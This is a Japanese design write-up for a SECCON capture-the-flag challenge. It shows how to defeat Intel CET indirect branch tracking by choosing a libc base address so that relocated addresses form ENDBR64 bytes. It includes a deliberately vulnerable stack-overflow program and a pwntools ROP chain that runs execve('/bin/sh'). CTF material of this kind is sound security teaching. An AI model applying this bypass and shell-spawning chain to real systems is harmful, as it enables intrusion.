# 問題名
pincette （Pinで作ったCET）

## テーマ
- Intel CETのIndirect Branch Tracking(IBT)で守られたプログラムvulnを攻略する
    - IBTって何？
        - `jump [rax]`とか`call rdx`みたいな間接分岐の宛先はENDBR64命令(F3 0F 1E FA)でないと落ちる仕組み。JOPやCOPで飛べる先を制限するために使われる。Tiger Lakeから実装されるぽい、未対応CPUにとってENDBR64はNOP相当（`rep hint_nop55 edx`）。
        - gccだと`-fcf-protection`オプションをつけることで関数のエントリとかがENDBR64命令になる。

## 脆弱性
vulnというプログラムにスタックバッファオーバーフローの脆弱性あり。これにより関数ポインタを書き換え、任意のアドレスに分岐可能。

### 前提
- vulnは`call rax`を実行し、`rax`は攻撃者が設定可能な状態、この宛先を適切に設定させる問題。
- vulnもlibc.soもコンパイル時に`-fcf-protection`オプションは使われていない。つまり普通にはENDBR64命令がでてこない。←そんな極端な状態でもIBTをバイパスできるケースがあることを示したい
- エクスプロイト前にlibcを配置するアドレスを指定できるようにしておく。←ASLRの最悪ケースを考えてみようという意図
    - `prelink -r 0x133700000 libc.so`とかすればlibc.soのベースアドレスを変更可能。
    - 環境変数`LD_USE_LOAD_BIAS`に1を設定しておけば、ASLRが有効なシステムでもローダーはベースアドレスを使ってくれる。
- libcは`-mcmodel=large -fno-pic`でコンパイルしておく。これにより64ビットの絶対アドレスをオペランドとして持つ命令が出力されるようになる。ロード時に再配置が発生するとリロケーションテーブルでアドレス部分が調整されるようになる。

#### ベースアドレス変更時のアセンブリの例
ベースアドレスが0x000000000のときに以下みたいな命令が
```
   5700b:       48 b8 6c 94 06 00 00    movabs $0x6946c,%rax
   57012:       00 00 00
   57015:       ff d0                   callq  *%rax
```
ベースアドレスが0x133700000になると、以下みたいになる。
```
   13375700b:   48 b8 6c 94 76 33 01    movabs $0x13376946c,%rax
   133757012:   00 00 00
   133757015:   ff d0                   callq  *%rax
```

### 脆弱なプログラムvuln
Cだとこんな感じのイメージ。readは(ENDBR64がなくて呼べないので)syscallを直接叩く。
```c
#include <unistd.h>
void _start()
{
    struct{
        char a[8];
        int (*b)(const char*,char*const*,char*const*);
        char c[16];
    } st;
    st.b = execve;
    read(0, st.a, 32);
    st.b("/bin/sh", NULL, NULL);
}
```
実際のアセンブリ。
```
0000000000401000 <_start>:
  401000:	55                   	push   rbp
  401001:	48 89 e5             	mov    rbp,rsp
  401004:	48 83 ec 20          	sub    rsp,0x20
  401008:	48 8b 05 e9 2f 00 00 	mov    rax,QWORD PTR [rip+0x2fe9]        # 403ff8 <execve>
  40100f:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  401013:	48 8d 45 e0          	lea    rax,[rbp-0x20]
  401017:	ba 20 00 00 00       	mov    edx,0x20
  40101c:	48 89 c6             	mov    rsi,rax
  40101f:	bf 00 00 00 00       	mov    edi,0x0
  401024:	b8 00 00 00 00       	mov    eax,0x0
  401029:	0f 05                	syscall
  40102b:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  40102f:	ba 00 00 00 00       	mov    edx,0x0
  401034:	be 00 00 00 00       	mov    esi,0x0
  401039:	48 8d 3d c0 0f 00 00 	lea    rdi,[rip+0xfc0]        # 402000 <_start+0x1000>
  401040:	ff d0                	call   rax
  401042:	90                   	nop
  401043:	c9                   	leave
  401044:	c3                   	ret
```

## 解答までの流れ
- libc.soのベースアドレスを工夫することで、命令のオペランド（64ビットの絶対アドレス）部分にENDBR64命令相当のバイト列を作り出して、そこを`call rax`の宛先にする。
- たくさんある候補から`endbr64; ... ; pop xxx; ret`な意味のガジェットを探し、それを使うことでROPに持ち込む。
    - IBTはretの戻り先は監視してない。ROP対策はIntel CETのもう一つの仕組みシャドウスタックの仕事。シャドウスタックな問題はSECCON2014オンラインで`ROP: Impossible`として出題したので今回はIBTにフォーカスした。
- raxに0x3b(execve)を設定した上でsyscallを呼ぶのが目標。
    - execveの中で`call rax`が出てくるため、IBTが有効だとexecveは呼べない。raxに0x3bを指定した上でsyscallに直接飛ぶ必要がある。
- ROPチェーンはこんな感じ（baseaddrは`0x04fa1dfe0000`）。
    - payload += pwn.p64(baseaddr+0x87a39)    # pop rcx ; sal ebx, 0xf ; pop rax ; fmul st(1) ; ret
    - payload += pwn.p64(baseaddr+0x8cbb4)    # endbr ; ... ; pop ebp ; ret
    - payload += pwn.p64(0x3b)                # rax for syscall (execve)
    - payload += pwn.p64(baseaddr+0x57ca8)    # syscall


## 参考資料
- https://software.intel.com/sites/default/files/managed/4d/2a/control-flow-enforcement-technology-preview.pdf

## 問題文
```
pincette.chal.seccon.jp:10000
```

## FLAG
FLAGファイルを参照。

## 検討した事項
- Intel CETの実装方法
    - 以下の理由からIntel Pinで自分で実装することにした。
        - 実機
            - 未発売。
        - qemu
            - 実装がない。やるなら自分で実装。問題としてはベースとなったqemuとパッチを提示？
        - bochs
            - 実装あるけどシステムエミュレーションで大掛かり。
        - Intel SDE
            - Intel PinベースなのでNXビットが無効になっていることに注意。コード領域であることをきちんと監視できるpintoolを組み込めればよいが、独自pintoolを組み込む正規な方法がないっぽい。
        - Intel Pin
            - コード領域の監視も含めpintoolとして実装。pintoolのソースを出すだけで問題の意図が伝わっていい感じ。
- 使うlibcについて
    - 要件と実現方法
        - アドレスを命令中の即値としてもたせる
            - -fno-picでコンパイルすればよい
        - 命令中のアドレスを64ビット幅にする（32ビット幅だと64ビット空間で再配置できないため）
            - -mcmodel=largeでコンパイルすればよい
        - 望んだ場所にロードさせる
            - prelinkを使えばよい
            - ASLRが有効な場合は環境変数`LD_USE_LOAD_BIAS=1`として実行すればよい
    - その他問題と解決方法
        - TLSを使うと64ビットで-fno-picは使えなくなるっぽい。
            - TLS(__threadな変数とか)を使っていないmusl libcを使う。glibcはTLS使っててだめだった。
        - musl付属のldはlibc.soの再配置時のコード領域書き換えに未対応っぽい（書き込み可能にせずに書こうとして落ちてる？）
            - 気持ち悪いけどldはGNU版を使う。
- Intel Pinでの実装上の注意
    - NXビットが無効になる
        - pintoolでRIPの範囲を監視しvulnやlibcのコード領域のみに制限すればきっと大丈夫。
    - JITコンパイル結果が上書きされるとpintoolでの制御自体が無意味になる
        - execve呼ぶ(raxの設定とsyscall呼び出し)よりJITコンパイル結果を上書きする方が大変なので気にしない
